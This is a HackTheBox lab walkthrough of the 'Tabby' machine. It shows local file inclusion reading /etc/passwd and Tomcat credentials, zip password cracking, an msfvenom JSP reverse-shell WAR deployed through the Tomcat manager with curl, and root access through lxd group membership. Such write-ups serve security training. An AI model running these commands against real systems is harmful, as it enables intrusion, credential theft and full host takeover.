@@ -1,0 +1,320 @@
+---
+layout: walkthrough
+title: HackTheBox - Tabby
+date: 2020-11-08 12:00:00 +0200
+img: ChallengeVMs/HTB_Icons/tabby.png # Add image post (optional)
+status: Active
+description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
+---
+
+Hi everyone, today we are going to be looking at Tabby --`10.10.10.194`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/Overview.png"  style="width: 65%" />
+</p>
+
+## Information Gathering
+
+In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.
+
+### Nmap Output
+
+<details>
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Tabby$ sudo nmap -sV -sC 10.10.10.194 -p 80,22,8080,8090
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-13 07:12 EDT
+Nmap scan report for 10.10.10.194
+Host is up (0.23s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+8090/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.2)
+|_http-server-header: SimpleHTTP/0.6 Python/3.8.2
+|_http-title: Directory listing for /
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.52 seconds
+
+```
+</details>
+
+From the output shown above, we can see that the machine is a Linux machine, and I added `tabby.htb` to the `/etc/hosts` file. As this is a Linux machine and it has 4 open ports, I'm going to start by browsing to each port which hopefully contains a web application -- since we have no usernames to even attempt to bruteforce SSH. When browsing to <http://tabbby.htb> we were presented with the following web page:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img1.png"  style="width: 100%" />
+</p>
+
+It seems as if the links do not have any additional information and the majority of the links within the web page do not have any content associated with them apart from the news link -- the `news.php` link itself points to `megahosting.htb`, so I needed to include within that domain within the `/etc/hosts` file. Browsing to `news.php?file=statement`, we are presented with the following web page.
+
+### Megahosting - Statement
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img5.png"  style="width: 100%" />
+</p>
+
+Based on the URL, it is likely that we can manipulate the information and retrieve a file of our choice. Sending this over to Burpsuite, we can manipulate the `file=` parameter and attempt to modify it to suit our requirements. The request is shown below:
+
+<details>
+```bat
+GET /news.php?file=statement HTTP/1.1
+Host: 10.10.10.194
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+
+</details>
+
+### Local File Inclusion
+
+In order to determine whether we could retrieve additional files from the host, I attempted to retrieve the `/etc/passwd` file. The image below shows that we were successful in this attempt and we have local file inclusion (LFI) on the web server:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img6.png"  style="width: 100%" />
+</p>
+
+After obtaining the `/etc/passwd` file, we know that there is a `ash` user on the machine, but I was also curious as to why we were able to obtain LFI on the web server. I decided to retrieve the `news.php` file which is shown below:
+
+<details>
+
+```php
+<?php
+$file = $_GET['file'];
+$fh = fopen("files/$file","r");
+while ($line = fgets($fh)) {
+  echo($line);
+}
+fclose($fh);
+?>
+```
+
+</details>
+
+Before I dive too deep into this vulnerability, I decided to have a look at the other open ports on this machine. If you recall from the Nmap output, we have port 8080 and 8090 which are also available to us. 
+
+### Port 8090
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img3.png"  style="width: 80%" />
+</p>
+
+When navigating to port 8090, we have directory listing on the web server. There are a few files here but we are mostly interested with the `backup.zip` folder at this point. The only other file within the directory that contained information was `statement` which provided us with the following links.
+
+<details>
+```html
+<li><a href="#pricing">Infrastructure</a></li>
+<li><a href="http://megahosting.htb/news.php?file=statement">News</a></li>
+<li><a href="#about">About</a></li>
+<li><a href="#callus">Support</a></li>
+```                                       
+</details>
+
+We already had the above information, but it's always good to ensure that you haven't missed anything while looking into other vulnerabilities. We did have the other folder which I tried to open but it was password protected. 
+
+### Password Protected Folder
+
+When attempting to open the zip file, we were asked for a password, as shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img4.png"  style="width: 60%" />
+</p>
+
+At this point we didn't have any potential passwords, so I decided to look into methods of cracking passwords for zip files. The following link provides some useful information regarding password cracking: <https://subscription.packtpub.com/book/networking_and_servers/9781784390303/6/06lvl1sec72/cracking-zip-file-passwords>. Based on this, I attempted to crack the password using the following command:
+
+```bat
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
+```
+
+Success! After a few seconds, we identified `admin@it` as being the required password and we were able to open the file. All that the zip folder contained however, was a backup of the web application, so unfortunately we didn't have any new information on that front, but we did have a potential password. I attempted to log in to the server via SSH with the `ash` user and the new password, but Ash required a public key for authentication and we were unable to read it using the LFI vulnerability.
+
+## Port 8080
+Since we exhausted our options with ports 22, 80, and 8090, I decided to look into the tomcat server on port 8080. Browsing to the URL provided us with the following:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img2.png"  style="width: 100%" />
+</p>
+
+When going to the manager screen, we have a `403 Access Denied` error message, however the image above does provide us with some useful information including the tomcat version. Using this information, we are able to abuse the LFI vulnerability and we were able to retrieve the `tomcat-users.xml` file by including the `/usr/share/tomcat9/etc/tomcat-users.xml` file. Reviewing the file contents in Burpsuite provides us with the following:
+
+<details>
+
+```xml
+HTTP/1.1 200 OK
+Date: Sun, 13 Sep 2020 12:50:06 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 2325
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              version="1.0">
+<!--
+  NOTE:  By default, no user is included in the "manager-gui" role required
+  to operate the "/manager/html" web application.  If you wish to use this app,
+  you must define such a user - the username and password are arbitrary. It is
+  strongly recommended that you do NOT use one of the users in the commented out
+  section below since they are intended for use with the examples web
+  application.
+-->
+<!--
+  NOTE:  The sample user and role entries below are intended for use with the
+  examples web application. They are wrapped in a comment and thus are ignored
+  when reading this file. If you wish to configure these users for use with the
+  examples web application, do not forget to remove the <!.. ..> that surrounds
+  them. You will also need to set the passwords to something appropriate.
+-->
+<!--
+  <role rolename="tomcat"/>
+  <role rolename="role1"/>
+  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
+  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
+  <user username="role1" password="<must-be-changed>" roles="role1"/>
+-->
+   <role rolename="admin-gui"/>f
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+</tomcat-users>
+```
+
+</details>
+
+As shown above, we now had the username, password combination for the tomcat admin-gui: `tomcat:$3cureP4s5w0rd123!`. Since the `/manager` web page is generally only available when authenticating to the host from the same machine, when we attempted to authenticate using the credentials, we were still presented with the Access Denied error message. Going back to the main page for port 8080, there was a link to `/manager-host` which we were able to authenticate to as shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img7.png"  style="width: 100%" />
+</p>
+
+
+Unlike the `/manager` web interface, the `/manager-host` page did not include upload functionality. After enumerating the web interface for a while, I went back to the main page and realised that it had another link to the `host-manager-howto` page: <http://10.10.10.194:8080/docs/host-manager-howto.html>. This page provided us with a bunch of information including the types of commands that you can run via command line in order to upload `.war` files to the host. Unlike the web interface however, this was only accessible via the `/manager` extension and not the `/manager-host` extension.  To ensure that we had access to the command line interface, I used the following curl command:
+
+```bat
+curl -v -u 'tomcat:$3cureP4s5w0rd123!' 'http://10.10.10.194:8080/manager/text/list'
+```
+
+As the command provided us with output, I knew that it was possible to interact with the manager via command line which meant that it was time to try and create a reverse shell. In order to achieve this, I started by creating a WAR file with msfvenom. The following link has a ton of information, regarding creating Metasploit Payloads: <https://netsec.ws/?p=331>. Since we needed to create a WAR file, I used the following command:
+
+```bat
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.147 LPORT=1234 -f war > shell.war
+```
+
+Now that we have a WAR file, we needed to upload the file to the tomcat manager. The following StackOverflow post had some really useful information on how to achieve this: <https://stackoverflow.com/questions/25029707/how-to-deploy-war-file-to-tomcat-using-command-prompt>. 
+
+From the above post -- one of the examples used curl as shown below:
+
+```bat
+curl -v -u user:password -T app.war 'http://tomcathost/manager/text/deploy?path=/my-app-path&update=true'
+```
+
+Modifying this curl command, we were able to upload our own WAR file:
+
+```bat
+curl -v -u 'tomcat:$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/shell&update=true'
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img8.png"  style="width: 80%" />
+</p>
+
+As shown above, the application was successfully deployed to the host and stored within `/shell`.  From there, I needed to access the shell in order for it to connect back to me. Once again, I made use of curl and accessed the WAR file with the following command:
+
+```
+curl -v -u 'tomcat:$3cureP4s5w0rd123!' 'http://10.10.10.194:8080/shell/'
+```
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img9.png"  style="width: 80%" />
+</p>
+
+## Lateral Movement to Ash
+
+Once we connected to the machine, I created a TTY shell with the following command:
+
+```python
+python3 -c “import pty;pty.spawn('/bin/bash')”
+```
+
+Looking back at my notes, I remembered that I had a username and potential password. I attempted to authenticate to the `ash` user using the credentials and I was able to authenticate successfully as shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img10.png"  style="width: 80%" />
+</p>
+
+
+## Privilege Escalation
+
+Using some basic enumeration as shown above, we can see that we were part of the `lxd` group. The following links provide some great information into the `lxd` group and exploiting it:
+
+* <https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/>
+* <https://www.hackingarticles.in/lxd-privilege-escalation/>
+
+Effectively, A member of the local "lxd" group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package. This is because LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket and it often does not attempt to match the privileges of the calling user. 
+
+In order for us to exploit this, we need the alpine-builder package. I downloaded the package using git clone: `git clone https://github.com/saghul/lxd-alpine-builder.git` and the transferred it to the tabby host by hosting a python web server on my kali machine and from there I was able to transfer it by using `curl -O`. With the alpine package on the host, we needed to build it using the following commands:
+
+```bat
+cd lxd-alpine-builder
+sudo ./build-alpine
+```
+
+From there, I needed to configure LXD, so I started the LXD initialization process with the `lxd init` command as shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img11.png"  style="width: 80%" />
+</p>
+
+After the image has been built it can be added as an image to LXD as follows:
+```bat
+lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias hotshoto
+```
+
+If you wanted to see that the image was successfully added to the lxc list, you could use: `lxc image list`. Now that I have created a new lxd container, as a final step I needed to give the container security privileges and then set its mount path as `/mnt` using the following commands:
+
+```bat
+lxc init newalpine hotshoto -c security.privileged=true
+lxc config device add hotshoto container disk source=/ path=/mnt/root recursive=true
+```
+
+With everything configured, I could start the new image using the following commands:
+
+```bat
+lxc start hotshoto
+lxc exec hotshoto /bin/sh
+```
+
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Tabby/img13.png"  style="width: 80%" />
+</p>
+
+After running the bash file, we see that we have a different shell which is the shell of the container. This container has all the files of the host machine and in order to browse the root object, we simply needed to navigate to `/mnt/root` to see all resources from the host machine. 
+
+That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
